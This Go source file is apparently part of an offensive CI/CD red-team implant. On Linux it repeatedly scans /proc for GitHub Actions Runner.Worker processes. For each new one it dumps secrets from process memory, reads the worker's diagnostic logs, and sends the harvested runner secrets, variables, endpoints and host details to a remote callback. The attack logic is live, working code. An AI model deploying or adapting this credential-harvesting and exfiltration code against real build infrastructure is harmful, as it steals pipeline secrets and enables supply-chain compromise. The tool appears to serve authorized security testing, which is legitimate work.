// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

//go:build linux
// +build linux

package brisket

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/boostsecurityio/smokedmeat/internal/models"
)

const residentWatchInterval = 250 * time.Millisecond

type residentWorkerProcess struct {
	PID       int
	Root      string
	StartTick string
	SeenAt    time.Time
}

func (a *Agent) startResidentJobWatcher(ctx context.Context) func() {
	if strings.TrimSpace(a.config.CallbackMode) != "resident" {
		return func() {}
	}
	watchCtx, cancel := context.WithCancel(ctx)
	go a.watchResidentJobs(watchCtx)
	return cancel
}

func (a *Agent) watchResidentJobs(ctx context.Context) {
	seen := make(map[string]time.Time)
	ticker := time.NewTicker(residentWatchInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			for _, worker := range residentWorkerProcesses() {
				key := worker.Root + ":" + worker.StartTick
				if key == ":" {
					key = fmt.Sprintf("%s:%d", worker.Root, worker.PID)
				}
				if _, ok := seen[key]; ok {
					continue
				}
				seen[key] = worker.SeenAt
				a.harvestResidentWorker(ctx, worker)
			}
			pruneResidentSeen(seen, time.Now().Add(-12*time.Hour))
		}
	}
}

func (a *Agent) harvestResidentWorker(ctx context.Context, worker residentWorkerProcess) {
	memdumpC := make(chan *MemDumpResult, 1)
	go func() {
		memdumpC <- a.DumpRunnerSecretsFromPID(worker.PID)
	}()

	observed := models.ResidentJobObservation{
		Event:                models.ResidentJobEventObserved,
		SignalSource:         "runner_worker_process",
		RunnerRoot:           worker.Root,
		WorkerPID:            worker.PID,
		WorkerProcessStarted: worker.StartTick,
		ObservedAt:           worker.SeenAt,
		HarvestProfile:       models.ResidentJobHarvestProfileLite,
	}
	observed.JobKey = residentJobKey(observed)
	observed.WorkerLog = waitForResidentWorkerLog(ctx, worker.Root, worker.SeenAt)
	if observed.WorkerLog != "" {
		observed = parseResidentWorkerLog(observed.WorkerLog, observed)
	}
	_ = a.sendResidentJob(ctx, observed, nil)

	var memdump *MemDumpResult
	select {
	case memdump = <-memdumpC:
	case <-ctx.Done():
		return
	}
	harvested := observed
	harvested.Event = models.ResidentJobEventHarvested
	harvested.HarvestedAt = time.Now().UTC()
	if memdump.Error != "" {
		harvested.Event = models.ResidentJobEventHarvestFailed
		harvested.Error = memdump.Error
	}
	_ = a.sendResidentJob(ctx, harvested, memdump)
}

func (a *Agent) sendResidentJob(ctx context.Context, observed models.ResidentJobObservation, memdump *MemDumpResult) error {
	payload := map[string]any{
		"agent_id":      a.agentID,
		"session_id":    a.config.SessionID,
		"hostname":      a.hostname,
		"os":            runtime.GOOS,
		"arch":          runtime.GOARCH,
		"pid":           os.Getpid(),
		"callback_id":   a.config.CallbackID,
		"callback_mode": a.config.CallbackMode,
		"resident_job":  observed,
	}
	if memdump != nil {
		payload["goos"] = runtime.GOOS
		payload["memdump_attempted"] = true
		payload["memdump_error"] = memdump.Error
		payload["memdump_pid"] = memdump.ProcessID
		payload["memdump_count"] = len(memdump.Secrets)
		payload["memdump_regions"] = memdump.RegionsScanned
		payload["memdump_bytes"] = memdump.BytesRead
		payload["memdump_read_errors"] = memdump.ReadErrors
		if len(memdump.Secrets) > 0 {
			payload["runner_secrets"] = memdump.Secrets
			payload["runner_pid"] = memdump.ProcessID
		}
		if len(memdump.Vars) > 0 {
			payload["runner_vars"] = memdump.Vars
		}
		if len(memdump.Endpoints) > 0 {
			payload["runner_endpoints"] = memdump.Endpoints
		}
	}
	data, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	return a.sendData(ctx, data)
}

func residentWorkerProcesses() []residentWorkerProcess {
	entries, err := filepath.Glob("/proc/[0-9]*")
	if err != nil {
		return nil
	}
	now := time.Now().UTC()
	workers := make([]residentWorkerProcess, 0)
	for _, entry := range entries {
		pid, err := strconv.Atoi(filepath.Base(entry))
		if err != nil {
			continue
		}
		exe, err := os.Readlink(filepath.Join(entry, "exe"))
		if err != nil || filepath.Base(exe) != "Runner.Worker" {
			continue
		}
		root := filepath.Dir(filepath.Dir(exe))
		if !residentRunnerRoot(root) {
			continue
		}
		workers = append(workers, residentWorkerProcess{
			PID:       pid,
			Root:      root,
			StartTick: residentProcessStartTick(pid),
			SeenAt:    now,
		})
	}
	return workers
}

func residentRunnerRoot(root string) bool {
	if root == "" {
		return false
	}
	if _, err := os.Stat(filepath.Join(root, "_diag")); err != nil {
		return false
	}
	if _, err := os.Stat(filepath.Join(root, "bin", "Runner.Listener")); err != nil {
		return false
	}
	return true
}

func residentProcessStartTick(pid int) string {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
	if err != nil {
		return ""
	}
	fields := strings.Fields(string(data))
	if len(fields) < 22 {
		return ""
	}
	return fields[21]
}

func waitForResidentWorkerLog(ctx context.Context, root string, since time.Time) string {
	deadline := time.NewTimer(3 * time.Second)
	defer deadline.Stop()
	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()

	for {
		if path := newestResidentWorkerLog(root, since); path != "" {
			return path
		}
		select {
		case <-ctx.Done():
			return ""
		case <-deadline.C:
			return ""
		case <-ticker.C:
		}
	}
}

func newestResidentWorkerLog(root string, since time.Time) string {
	entries, err := os.ReadDir(filepath.Join(root, "_diag"))
	if err != nil {
		return ""
	}
	var newest string
	var newestMod time.Time
	for _, entry := range entries {
		if entry.IsDir() || !strings.HasPrefix(entry.Name(), "Worker_") || !strings.HasSuffix(entry.Name(), ".log") {
			continue
		}
		info, err := entry.Info()
		if err != nil {
			continue
		}
		if info.ModTime().Before(since.Add(-10 * time.Second)) {
			continue
		}
		if newest == "" || info.ModTime().After(newestMod) {
			newest = filepath.Join(root, "_diag", entry.Name())
			newestMod = info.ModTime()
		}
	}
	return newest
}

func pruneResidentSeen(seen map[string]time.Time, before time.Time) {
	for key, ts := range seen {
		if ts.Before(before) {
			delete(seen, key)
		}
	}
}
